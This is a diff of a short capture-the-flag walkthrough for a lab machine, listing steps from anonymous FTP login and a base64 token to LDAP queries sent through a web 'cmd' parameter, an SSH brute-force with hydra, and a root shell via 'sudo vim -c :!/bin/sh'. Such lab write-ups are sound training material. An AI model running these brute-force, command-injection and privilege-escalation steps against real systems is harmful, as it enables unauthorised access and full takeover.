@@ -3,14 +3,19 @@
         - login with user anonymous
 - Look up for flags: 
     - Get anonymous user with a base64 password
-- Check other services, the base64 password is used to do a query on LDAP 
-    - First check the ldap base: ldapsearch -x -s base -b "" -H ldap://ns-server-1 namingContexts // to check the base
+- Access the web server in /validate to get the next step info
+    - You have to check DNS domains to get the web server where the server is in a subdomain of the zone
+    - curl "http://www.ctf.local/validate?token=YWRtaW4=" --header "Host: www.ctf.local"    
+    - The web server has the same ip of the machine but it has another name    
+- Check other services, the base64 password is used to do a query on LDAP
+     - First check the ldap base:
+        - http://www.ctf.local/ldapquery?token=YWRtaW4=&cmd=ldapsearch+-x+-s+base+-b+%22%22+-H+ldap://ns-server-1+namingContexts
 - Do a ldap search with cn=admin a default user to do this querys
-    - ldapsearch -x -D "cn=admin,dc=ctf,dc=local" -b "dc=ctf,dc=local" -H ldap://ns-server-1 -w <base64 password> use the base64 passsword used
-- A Flag is in LDAP in the user david, whjich has ssh permissions
+    - http://www.ctf.local/ldapquery?token=YWRtaW4=&cmd=ldapsearch+-x+-D+cn=admin,dc=ctf,dc=local+-b+dc=ctf,dc=local+-H+ldap://localhost+-w+admin
+   
+- A Flag is in LDAP in the user david, which has ssh permissions
 - Use hydra to do a brute force ssh
     - hydra -L usernames.txt -P password.txt ssh://192.168.1.86 -t 4 -vV // 
 - After getting the david's password do a ssh with david to the machibne
 - List sudo commands for david as : sudo -l 
 - Run sudo vim -c ':!/bin/sh to get root access
-- Ger other FLAGS, 
